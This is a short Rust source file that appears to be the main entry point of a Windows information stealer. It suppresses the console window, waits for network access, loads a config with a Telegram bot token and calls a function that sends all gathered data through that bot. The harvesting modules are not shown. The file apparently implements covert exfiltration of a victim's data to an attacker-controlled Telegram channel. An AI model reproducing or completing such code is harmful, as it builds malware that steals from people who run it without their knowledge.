#![windows_subsystem = "windows"]

use std::{fs, thread::sleep, time::Duration};
use teloxide::Bot;

#[tokio::main]
async fn main(){
    while !utils::check_connection() {sleep(Duration::from_secs(3))}
    let cfg = config::Config::init();
    let _ = fs::create_dir(&cfg.my_dir);
    let bot = Bot::new(&cfg.bot_token);
    lib::send_all(&bot).await;
}